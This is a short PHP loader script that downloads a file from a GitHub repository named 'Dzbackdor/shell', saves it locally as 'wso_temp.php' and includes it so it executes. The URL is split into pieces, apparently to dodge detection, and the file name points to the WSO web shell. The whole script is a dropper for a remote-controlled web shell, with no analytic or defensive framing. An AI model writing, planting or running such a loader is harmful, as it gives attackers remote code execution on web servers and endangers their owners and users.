<?php
$awo = 'htt'.'ps://';
$url = $awo.'raw.githubusercontent.com/Dzbackdor/shell/master/opet.php';
$local_file = 'wso_temp.php';

function download_file($url, $local_file) {
    $content = file_get_contents($url);
    if ($content !== false) {
        file_put_contents($local_file, $content);
        return true;
    }
    return false;
}

if (!file_exists($local_file) || filesize($local_file) === 0) {
    if (!download_file($url, $local_file)) {
        die("Failed to download the content.");
    }
}

include $local_file;
?>
